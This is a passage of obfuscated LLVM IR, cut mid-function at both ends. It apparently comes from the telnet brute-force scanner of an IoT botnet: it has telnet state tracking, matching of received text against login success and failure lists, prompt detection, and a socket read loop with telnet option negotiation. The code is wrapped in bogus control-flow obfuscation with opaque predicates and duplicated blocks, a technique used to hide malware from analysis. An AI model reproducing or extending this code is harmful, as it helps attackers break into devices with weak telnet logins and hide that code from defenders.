  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %44

; <label>:44:                                     ; preds = %originalBBpart24, %originalBBpart2
  %45 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %46 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i32 0, i32 7
  store i32 0, i32* %46, align 8
  %47 = load i32, i32* %12, align 4
  %48 = trunc i32 %47 to i8
  %49 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i32 0, i32 2
  store i8 %48, i8* %50, align 8
  %51 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %52 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i32 0, i32 9
  %53 = load i8*, i8** %52, align 8
  call void @llvm.memset.p0i8.i64(i8* %53, i8 0, i64 1024, i32 1, i1 false)
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %54 = alloca %struct.telstate_t*, align 8
  %55 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %54, align 8
  store i32 %1, i32* %55, align 4
  %56 = load i32, i32* %55, align 4
  %57 = icmp eq i32 %56, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %23
  %58 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %59 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %58, i32 0, i32 0
  %60 = load i32, i32* %59, align 8
  %61 = call i32 @close(i32 %60)
  br label %originalBB1
}

declare i32 @close(i32) #2

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = load i32, i32* @x.59
  %3 = load i32, i32* @y.60
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %10, align 8
  %11 = load %struct.telstate_t*, %struct.telstate_t** %10, align 8
  call void @advance_state(%struct.telstate_t* %11, i32 0)
  %12 = load %struct.telstate_t*, %struct.telstate_t** %10, align 8
  %13 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %12, i32 0, i32 3
  store i8 1, i8* %13, align 1
  %14 = load i32, i32* @x.59
  %15 = load i32, i32* @y.60
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %22 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %22, align 8
  %23 = load %struct.telstate_t*, %struct.telstate_t** %22, align 8
  call void @advance_state(%struct.telstate_t* %23, i32 0)
  %24 = load %struct.telstate_t*, %struct.telstate_t** %22, align 8
  %25 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i32 0, i32 3
  store i8 1, i8* %25, align 1
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = load i32, i32* @x.61
  %3 = load i32, i32* @y.62
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  store i8* %0, i8** %10, align 8
  %11 = load i8*, i8** %10, align 8
  %12 = call i32 @contains_string(i8* %11, i8** getelementptr inbounds ([4 x i8*], [4 x i8*]* @successes, i32 0, i32 0))
  %13 = load i32, i32* @x.61
  %14 = load i32, i32* @y.62
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %12

originalBBalteredBB:                              ; preds = %originalBB, %1
  %21 = alloca i8*, align 8
  store i8* %0, i8** %21, align 8
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 @contains_string(i8* %22, i8** getelementptr inbounds ([4 x i8*], [4 x i8*]* @successes, i32 0, i32 0))
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %10, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8*, i8** %2, align 8
  %8 = call i32 @contains_fail(i8* %7)
  %9 = icmp ne i32 %8, 0
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ true, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = load i32, i32* @x.67
  %3 = load i32, i32* @y.68
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i8* %0, i8** %11, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.91, i32 0, i32 0), i8** %12, align 8
  %16 = load i8*, i8** %11, align 8
  %17 = call i64 @strlen(i8* %16) #9
  %18 = trunc i64 %17 to i32
  store i32 %18, i32* %13, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %14, align 4
  %19 = load i32, i32* @x.67
  %20 = load i32, i32* @y.68
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %27

; <label>:27:                                     ; preds = %161, %originalBBpart2
  %28 = load i32, i32* %14, align 4
  %29 = sext i32 %28 to i64
  %30 = load i8*, i8** %12, align 8
  %31 = call i64 @strlen(i8* %30) #9
  %32 = icmp ult i64 %29, %31
  br i1 %32, label %33, label %164

; <label>:33:                                     ; preds = %27
  br label %34

; <label>:34:                                     ; preds = %122, %33
  %35 = load i32, i32* @x.67
  %36 = load i32, i32* @y.68
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %34
  %43 = load i32, i32* %13, align 4
  %44 = load i32, i32* %15, align 4
  %45 = icmp sgt i32 %43, %44
  %46 = load i32, i32* @x.67
  %47 = load i32, i32* @y.68
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %45, label %54, label %120

; <label>:54:                                     ; preds = %originalBBpart24
  %55 = load i8*, i8** %11, align 8
  %56 = load i32, i32* %13, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  %59 = load i32, i32* %15, align 4
  %60 = sext i32 %59 to i64
  %61 = sub i64 0, %60
  %62 = getelementptr inbounds i8, i8* %58, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %118, label %66

; <label>:66:                                     ; preds = %54
  %67 = load i8*, i8** %11, align 8
  %68 = load i32, i32* %13, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %67, i64 %69
  %71 = load i32, i32* %15, align 4
  %72 = sext i32 %71 to i64
  %73 = sub i64 0, %72
  %74 = getelementptr inbounds i8, i8* %70, i64 %73
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = icmp eq i32 %76, 32
  br i1 %77, label %118, label %78

; <label>:78:                                     ; preds = %66
  %79 = load i32, i32* @x.67
  %80 = load i32, i32* @y.68
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %78
  %87 = load i8*, i8** %11, align 8
  %88 = load i32, i32* %13, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i8, i8* %87, i64 %89
  %91 = load i32, i32* %15, align 4
  %92 = sext i32 %91 to i64
  %93 = sub i64 0, %92
  %94 = getelementptr inbounds i8, i8* %90, i64 %93
  %95 = load i8, i8* %94, align 1
  %96 = sext i8 %95 to i32
  %97 = icmp eq i32 %96, 13
  %98 = load i32, i32* @x.67
  %99 = load i32, i32* @y.68
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart216, label %originalBB6alteredBB

originalBBpart216:                                ; preds = %originalBB6
  br i1 %97, label %118, label %106

; <label>:106:                                    ; preds = %originalBBpart216
  %107 = load i8*, i8** %11, align 8
  %108 = load i32, i32* %13, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %107, i64 %109
  %111 = load i32, i32* %15, align 4
  %112 = sext i32 %111 to i64
  %113 = sub i64 0, %112
  %114 = getelementptr inbounds i8, i8* %110, i64 %113
  %115 = load i8, i8* %114, align 1
  %116 = sext i8 %115 to i32
  %117 = icmp eq i32 %116, 10
  br label %118

; <label>:118:                                    ; preds = %106, %originalBBpart216, %66, %54
  %119 = phi i1 [ true, %originalBBpart216 ], [ true, %66 ], [ true, %54 ], [ %117, %106 ]
  br label %120

; <label>:120:                                    ; preds = %118, %originalBBpart24
  %121 = phi i1 [ false, %originalBBpart24 ], [ %119, %118 ]
  br i1 %121, label %122, label %125

; <label>:122:                                    ; preds = %120
  %123 = load i32, i32* %15, align 4
  %124 = add nsw i32 %123, 1
  store i32 %124, i32* %15, align 4
  br label %34

; <label>:125:                                    ; preds = %120
  %126 = load i32, i32* @x.67
  %127 = load i32, i32* @y.68
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %125
  %134 = load i8*, i8** %11, align 8
  %135 = load i32, i32* %13, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i8, i8* %134, i64 %136
  %138 = load i32, i32* %15, align 4
  %139 = sext i32 %138 to i64
  %140 = sub i64 0, %139
  %141 = getelementptr inbounds i8, i8* %137, i64 %140
  %142 = load i8, i8* %141, align 1
  %143 = sext i8 %142 to i32
  %144 = load i8*, i8** %12, align 8
  %145 = load i32, i32* %14, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds i8, i8* %144, i64 %146
  %148 = load i8, i8* %147, align 1
  %149 = sext i8 %148 to i32
  %150 = icmp eq i32 %143, %149
  %151 = load i32, i32* @x.67
  %152 = load i32, i32* @y.68
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBBpart223, label %originalBB18alteredBB

originalBBpart223:                                ; preds = %originalBB18
  br i1 %150, label %159, label %160

; <label>:159:                                    ; preds = %originalBBpart223
  store i32 1, i32* %10, align 4
  br label %165

; <label>:160:                                    ; preds = %originalBBpart223
  br label %161

; <label>:161:                                    ; preds = %160
  %162 = load i32, i32* %14, align 4
  %163 = add nsw i32 %162, 1
  store i32 %163, i32* %14, align 4
  br label %27

; <label>:164:                                    ; preds = %27
  store i32 0, i32* %10, align 4
  br label %165

; <label>:165:                                    ; preds = %164, %159
  %166 = load i32, i32* %10, align 4
  ret i32 %166

originalBBalteredBB:                              ; preds = %originalBB, %1
  %167 = alloca i32, align 4
  %168 = alloca i8*, align 8
  %169 = alloca i8*, align 8
  %170 = alloca i32, align 4
  %171 = alloca i32, align 4
  %172 = alloca i32, align 4
  store i8* %0, i8** %168, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.91, i32 0, i32 0), i8** %169, align 8
  %173 = load i8*, i8** %168, align 8
  %174 = call i64 @strlen(i8* %173) #9
  %175 = trunc i64 %174 to i32
  store i32 %175, i32* %170, align 4
  store i32 0, i32* %172, align 4
  store i32 0, i32* %171, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %34
  %176 = load i32, i32* %13, align 4
  %177 = load i32, i32* %15, align 4
  %178 = icmp sgt i32 %176, %177
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %78
  %179 = load i8*, i8** %11, align 8
  %180 = load i32, i32* %13, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds i8, i8* %179, i64 %181
  %183 = load i32, i32* %15, align 4
  %184 = sext i32 %183 to i64
  %_ = shl i64 0, %184
  %_7 = sub i64 0, 0
  %gen = add i64 %_7, %184
  %_8 = shl i64 0, %184
  %_9 = sub i64 0, 0
  %gen10 = add i64 %_9, %184
  %_11 = sub i64 0, 0
  %gen12 = add i64 %_11, %184
  %_13 = sub i64 0, %184
  %gen14 = mul i64 %_13, %184
  %185 = sub i64 0, %184
  %186 = getelementptr inbounds i8, i8* %182, i64 %185
  %187 = load i8, i8* %186, align 1
  %188 = sext i8 %187 to i32
  %189 = icmp eq i32 %188, 13
  br label %originalBB6

originalBB18alteredBB:                            ; preds = %originalBB18, %125
  %190 = load i8*, i8** %11, align 8
  %191 = load i32, i32* %13, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds i8, i8* %190, i64 %192
  %194 = load i32, i32* %15, align 4
  %195 = sext i32 %194 to i64
  %_19 = shl i64 0, %195
  %_20 = shl i64 0, %195
  %_21 = shl i64 0, %195
  %196 = sub i64 0, %195
  %197 = getelementptr inbounds i8, i8* %193, i64 %196
  %198 = load i8, i8* %197, align 1
  %199 = sext i8 %198 to i32
  %200 = load i8*, i8** %12, align 8
  %201 = load i32, i32* %14, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds i8, i8* %200, i64 %202
  %204 = load i8, i8* %203, align 1
  %205 = sext i8 %204 to i32
  %206 = icmp eq i32 %199, %205
  br label %originalBB18
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %280, %8
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %64

; <label>:38:                                     ; preds = %33
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %40 = load i64, i64* %39, align 8
  %41 = icmp sgt i64 %40, 0
  br i1 %41, label %62, label %42

; <label>:42:                                     ; preds = %38
  %43 = load i32, i32* @x.69
  %44 = load i32, i32* @y.70
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %42
  %51 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %52 = load i64, i64* %51, align 8
  %53 = icmp sgt i64 %52, 0
  %54 = load i32, i32* @x.69
  %55 = load i32, i32* @y.70
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %62

; <label>:62:                                     ; preds = %originalBBpart2, %38
  %63 = phi i1 [ true, %38 ], [ %53, %originalBBpart2 ]
  br label %64

; <label>:64:                                     ; preds = %62, %33
  %65 = phi i1 [ false, %33 ], [ %63, %62 ]
  br i1 %65, label %66, label %281

; <label>:66:                                     ; preds = %64
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %69 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 0
  %70 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %69) #3, !srcloc !5
  %71 = extractvalue { i64, i64* } %70, 0
  %72 = extractvalue { i64, i64* } %70, 1
  %73 = trunc i64 %71 to i32
  store i32 %73, i32* %24, align 4
  %74 = ptrtoint i64* %72 to i64
  %75 = trunc i64 %74 to i32
  store i32 %75, i32* %25, align 4
  br label %76

; <label>:76:                                     ; preds = %67
  %77 = load i32, i32* @x.69
  %78 = load i32, i32* @y.70
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %76
  %85 = load i32, i32* %10, align 4
  %86 = srem i32 %85, 64
  %87 = zext i32 %86 to i64
  %88 = shl i64 1, %87
  %89 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %90 = load i32, i32* %10, align 4
  %91 = sdiv i32 %90, 64
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [16 x i64], [16 x i64]* %89, i64 0, i64 %92
  %94 = load i64, i64* %93, align 8
  %95 = or i64 %94, %88
  store i64 %95, i64* %93, align 8
  %96 = load i32, i32* %10, align 4
  %97 = add nsw i32 %96, 1
  %98 = call i32 @select(i32 %97, %struct.fd_set* %21, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %22)
  %99 = icmp slt i32 %98, 1
  %100 = load i32, i32* @x.69
  %101 = load i32, i32* @y.70
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart238, label %originalBB1alteredBB

originalBBpart238:                                ; preds = %originalBB1
  br i1 %99, label %108, label %125

; <label>:108:                                    ; preds = %originalBBpart238
  %109 = load i32, i32* @x.69
  %110 = load i32, i32* @y.70
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %108
  %117 = load i32, i32* @x.69
  %118 = load i32, i32* @y.70
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br label %281

; <label>:125:                                    ; preds = %originalBBpart238
  %126 = load i8*, i8** %15, align 8
  %127 = load i32, i32* %18, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds i8, i8* %126, i64 %128
  store i8* %129, i8** %23, align 8
  %130 = load i32, i32* %10, align 4
  %131 = load i8*, i8** %23, align 8
  %132 = call i64 @recv(i32 %130, i8* %131, i64 1, i32 0)
  %133 = trunc i64 %132 to i32
  store i32 %133, i32* %19, align 4
  %134 = load i32, i32* %19, align 4
  %135 = icmp eq i32 %134, -1
  br i1 %135, label %139, label %136

; <label>:136:                                    ; preds = %125
  %137 = load i32, i32* %19, align 4
  %138 = icmp eq i32 %137, 0
  br i1 %138, label %139, label %156

; <label>:139:                                    ; preds = %136, %125
  %140 = load i32, i32* @x.69
  %141 = load i32, i32* @y.70
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %139
  store i32 0, i32* %9, align 4
  %148 = load i32, i32* @x.69
  %149 = load i32, i32* @y.70
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br label %286

; <label>:156:                                    ; preds = %136
  %157 = load i32, i32* %19, align 4
  %158 = load i32, i32* %18, align 4
  %159 = add nsw i32 %158, %157
  store i32 %159, i32* %18, align 4
  %160 = load i8*, i8** %23, align 8
  %161 = load i8, i8* %160, align 1
  %162 = zext i8 %161 to i32
  %163 = icmp eq i32 %162, 255
  br i1 %163, label %164, label %266

; <label>:164:                                    ; preds = %156
  %165 = load i32, i32* @x.69
  %166 = load i32, i32* @y.70
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %164
  %173 = load i32, i32* %10, align 4
  %174 = load i8*, i8** %23, align 8
  %175 = getelementptr inbounds i8, i8* %174, i64 1
  %176 = call i64 @recv(i32 %173, i8* %175, i64 2, i32 0)
  %177 = trunc i64 %176 to i32
  store i32 %177, i32* %19, align 4
  %178 = load i32, i32* %19, align 4
  %179 = icmp eq i32 %178, -1
  %180 = load i32, i32* @x.69
  %181 = load i32, i32* @y.70
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br i1 %179, label %207, label %188

; <label>:188:                                    ; preds = %originalBBpart250
  %189 = load i32, i32* @x.69
  %190 = load i32, i32* @y.70
  %191 = sub i32 %189, 1
  %192 = mul i32 %189, %191
  %193 = urem i32 %192, 2
  %194 = icmp eq i32 %193, 0
  %195 = icmp slt i32 %190, 10
  %196 = or i1 %194, %195
  br i1 %196, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %188
  %197 = load i32, i32* %19, align 4
  %198 = icmp eq i32 %197, 0
  %199 = load i32, i32* @x.69
  %200 = load i32, i32* @y.70
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br i1 %198, label %207, label %208

; <label>:207:                                    ; preds = %originalBBpart254, %originalBBpart250
  store i32 0, i32* %9, align 4
  br label %286

; <label>:208:                                    ; preds = %originalBBpart254
  %209 = load i32, i32* @x.69
  %210 = load i32, i32* @y.70
  %211 = sub i32 %209, 1
  %212 = mul i32 %209, %211
  %213 = urem i32 %212, 2
  %214 = icmp eq i32 %213, 0
  %215 = icmp slt i32 %210, 10
  %216 = or i1 %214, %215
  br i1 %216, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %208
  %217 = load i32, i32* %19, align 4
  %218 = load i32, i32* %18, align 4
  %219 = add nsw i32 %218, %217
  store i32 %219, i32* %18, align 4
  %220 = load i32, i32* %10, align 4
  %221 = load i8*, i8** %23, align 8
  %222 = call i32 @negotiate(i32 %220, i8* %221, i32 3)
  %223 = icmp ne i32 %222, 0
  %224 = load i32, i32* @x.69
  %225 = load i32, i32* @y.70
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBBpart267, label %originalBB56alteredBB

originalBBpart267:                                ; preds = %originalBB56
  br i1 %223, label %249, label %232

; <label>:232:                                    ; preds = %originalBBpart267
  %233 = load i32, i32* @x.69
  %234 = load i32, i32* @y.70
  %235 = sub i32 %233, 1
  %236 = mul i32 %233, %235
  %237 = urem i32 %236, 2
  %238 = icmp eq i32 %237, 0
  %239 = icmp slt i32 %234, 10
  %240 = or i1 %238, %239
  br i1 %240, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %232
  store i32 0, i32* %9, align 4
  %241 = load i32, i32* @x.69
  %242 = load i32, i32* @y.70
  %243 = sub i32 %241, 1
  %244 = mul i32 %241, %243
  %245 = urem i32 %244, 2
  %246 = icmp eq i32 %245, 0
  %247 = icmp slt i32 %242, 10
  %248 = or i1 %246, %247
  br i1 %248, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br label %286

; <label>:249:                                    ; preds = %originalBBpart267
  %250 = load i32, i32* @x.69
  %251 = load i32, i32* @y.70
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %249
  %258 = load i32, i32* @x.69
  %259 = load i32, i32* @y.70
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br label %280

; <label>:266:                                    ; preds = %156
  %267 = load i8*, i8** %15, align 8
  %268 = load i8*, i8** %11, align 8
  %269 = call i8* @strstr(i8* %267, i8* %268) #9
